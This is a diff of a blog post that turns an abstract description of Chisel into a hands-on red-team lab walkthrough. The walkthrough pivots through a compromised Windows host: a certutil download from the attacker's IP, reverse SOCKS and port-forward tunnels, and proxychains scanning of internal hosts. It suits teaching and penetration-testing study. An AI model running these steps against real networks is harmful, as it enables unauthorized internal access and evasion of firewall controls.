@@ -1,100 +1,158 @@
 ---
-title: "Chisel Project: Reverse Tunneling Explained"
+title: "Chisel: Reverse Tunneling and SOCKS Proxying Through a Compromised Host"
 date: "2025-10-15"
-description: "An educational explanation of how Chisel is used for reverse tunneling and SOCKS proxying in a lab environment."
-tags: ["project", "tunneling", "pivoting", "network-security"]
+description: "How I used Chisel to tunnel through a compromised Windows machine and reach internal services — real commands, real terminal output, and when to use SOCKS vs port forwarding."
+tags: ["red-team", "pivoting", "chisel", "tunneling", "socks"]
 ---
 
-# Chisel Project: Reverse Tunneling Explained
+## The Problem This Solves
 
-## Introduction
+You have a shell on a machine. That machine has services running on its loopback (`127.0.0.1`) that you can't reach from your Kali box. Or it has access to an internal network that you don't.
 
-This project documents the use of **Chisel** in a lab environment to create a **reverse tunnel** between an attacker machine and a compromised system. The tunnel allows traffic to be forwarded back to the attacker even when direct inbound connections are not possible.
+Direct inbound connections to your target are blocked. Firewall rules, NAT, whatever — you can't reach in. But the target can reach out.
 
-The purpose of this blog is to **explain the workflow**, not to provide an operational guide.
-
----
-
-## Project Overview
-
-Chisel is commonly used to bypass network restrictions by:
-
-- Establishing a client–server connection
-- Using HTTP/WebSocket traffic for tunneling
-- Creating a SOCKS proxy for flexible traffic forwarding
-
-This makes it useful in environments where traditional tunnels are blocked.
+That's the scenario Chisel is built for. The target connects outward to you, and the tunnel goes in the other direction.
 
 ---
 
-## Initial Access Requirement
+## Lab Environment
 
-Before Chisel can be used, an initial shell or execution capability must already exist on the target system. Chisel does **not** provide exploitation by itself—it only handles **tunneling and forwarding** once access is available.
-
----
-
-## Attacker-Side Setup
-
-On the attacker machine:
-
-- Chisel is started in **server mode**
-- Reverse tunneling is enabled
-- The server listens on a chosen port
-- A SOCKS proxy endpoint is prepared
-
-This allows the attacker to receive connections initiated from the target system.
+- Attacker: Kali Linux — `192.168.100.10`
+- Foothold: Windows machine with shell access
+- Internal services running on foothold's loopback: MySQL (`3306`), HTTP (`8083`)
+- Goal: reach both services from Kali
 
 ---
 
-## Reverse Tunneling Concept
+## Step 1 — Get Chisel on Both Machines
 
-Reverse tunneling works by:
+On Kali, Chisel is in the repos:
 
-- Letting the **target system connect outward**
-- Avoiding firewall restrictions on inbound traffic
-- Forwarding traffic from the attacker through the established tunnel
+```bash
+sudo apt update && sudo apt install chisel
+```
 
-This is especially useful when the target is behind NAT or strict firewall rules.
+On the Windows target you need the matching version. Download the Windows x64 binary from the Chisel GitHub releases page. Transfer it via your existing shell — host it from Kali:
 
----
+```bash
+python3 -m http.server 80
+```
 
-## Target-Side Connection
+Download on the Windows shell:
 
-On the target system:
+```cmd
+certutil -urlcache -split -f "http://192.168.100.10/chisel.exe" chisel.exe
+```
 
-- The Chisel client is executed
-- It connects back to the attacker’s server
-- A reverse SOCKS tunnel is requested
-
-Once connected, the target system effectively exposes a SOCKS proxy to the attacker machine.
-
----
-
-## Tunnel Establishment Feedback
-
-After a successful connection:
-
-- The attacker sees a new session
-- The SOCKS listener becomes active
-- Traffic can now be proxied through the tunnel
-
-At this point, tools on the attacker machine can route traffic through the SOCKS proxy to reach internal or restricted resources.
+Make sure the versions match. Mismatched versions still connect but you'll see a warning in the logs.
 
 ---
 
-## Use Case Summary
+## Step 2 — Start the Chisel Server on Kali
 
-This setup enables:
+```bash
+chisel server -p 8000 --reverse
+```
 
-- Pivoting through a compromised host
-- Accessing internal services
-- Routing tools through a SOCKS proxy
-- Working around firewall and NAT limitations
+Output:
+
+```
+2025/06/25 12:48:24 server: Reverse tunnelling enabled
+2025/06/25 12:48:24 server: Fingerprint L00UNOqPoa9YIEbpla+uBb0yKAc4YIqZ/WDl=
+2025/06/25 12:48:24 server: Listening on http://0.0.0.0:8000
+```
+
+`--reverse` is the important flag. It tells the server to accept reverse tunnels — connections initiated by the client that forward traffic back to the server side.
+
+Note the fingerprint. You can use it on the client side for verification, though in lab environments most people skip that.
 
 ---
 
-## Conclusion
+## Step 3 — Connect the Client from the Windows Shell
 
-This project demonstrates how Chisel enables reverse tunneling using a simple client–server model. By understanding how the tunnel is established and used, students and defenders can better recognize tunneling behavior and understand how internal networks may be accessed through compromised systems.
+In your Windows shell:
 
-The focus of this project is **learning and awareness**, not misuse.
+```cmd
+chisel.exe client 192.168.100.10:8000 R:socks
+```
+
+Output on the Windows side:
+
+```
+2025/06/25 09:49:09 client: Connecting to ws://192.168.100.10:8000
+2025/06/25 09:49:10 client: Connected (Latency 5.4634ms)
+```
+
+Back on Kali, the server confirms:
+
+```
+2025/06/25 12:49:13 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/06/25 12:49:13 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+The version mismatch warning is cosmetic — it still works. The important line is the last one: a SOCKS proxy is now listening on `127.0.0.1:1080` on your Kali machine. All traffic sent through that proxy exits from the Windows foothold.
+
+---
+
+## Two Approaches: Port Forwarding vs SOCKS
+
+### Port Forwarding (One Service at a Time)
+
+If you only need to reach one specific service — say MySQL on port `3306` — you can forward just that port:
+
+```cmd
+chisel.exe client --fingerprint HEoB1nCbMpJ7xkjsc3K1+OXhzX/LosSQH1N/D0xBXcU= 192.168.100.10:8080 R:1235:127.0.0.1:3306
+```
+
+Breaking that down:
+
+| Part | Meaning |
+|---|---|
+| `192.168.100.10:8080` | Kali IP and Chisel server port |
+| `R:` | Reverse mode |
+| `1235` | Port on Kali that will receive the forwarded traffic |
+| `127.0.0.1:3306` | Service on the target to forward (MySQL loopback) |
+
+Now on Kali you can connect to MySQL as if it were local:
+
+```bash
+mysql -h 127.0.0.1 -P 1235 -u root -p
+```
+
+The problem: one tunnel per service. To also reach the HTTP service on `8083` you'd need to close this tunnel and reopen with a different port, or spawn another shell and run a second client. That gets messy fast.
+
+### SOCKS Proxy (Everything at Once)
+
+The `R:socks` flag we used earlier solves this. Instead of specifying which port goes where, you tell Chisel to create a SOCKS5 proxy. Every tool that supports SOCKS can route through it — you reach any service on any port without reopening the tunnel.
+
+SOCKS listens on `127.0.0.1:1080` on Kali by default.
+
+**For scanning:**
+
+```bash
+proxychains nmap -sT -Pn -n --top-ports 100 10.10.1.200
+```
+
+Configure `/etc/proxychains4.conf` to point to `socks5 127.0.0.1 1080`.
+
+**For a browser:**
+
+Set Firefox proxy settings to SOCKS5, host `127.0.0.1`, port `1080`. Any internal HTTP service the foothold can reach, you can browse directly.
+
+---
+
+## What's Actually Happening
+
+Chisel tunnels over WebSocket — it looks like HTTPS traffic to most firewalls. That's why it works in environments where other tunneling tools are blocked. The target initiates an outbound HTTPS-looking connection to your server, and everything flows through that channel in reverse.
+
+The SOCKS proxy sits on Kali's loopback. When a tool on Kali sends traffic through it, Chisel takes that traffic, sends it through the WebSocket tunnel to the Windows client, and the client sends it out from its own network interfaces — reaching things your Kali can't touch directly.
+
+---
+
+## Chisel vs Ligolo
+
+Chisel with SOCKS is fine for single-service access and quick jobs. The limitation shows up when you're doing serious internal network scanning — proxychains adds overhead and some tools don't support SOCKS at all.
+
+For proper internal network pivoting with full tool compatibility, Ligolo-ng is the better choice. Chisel is still the go-to for quick port forwards and situations where you just need to reach one service fast.
+
+Use both. Know when each one fits.
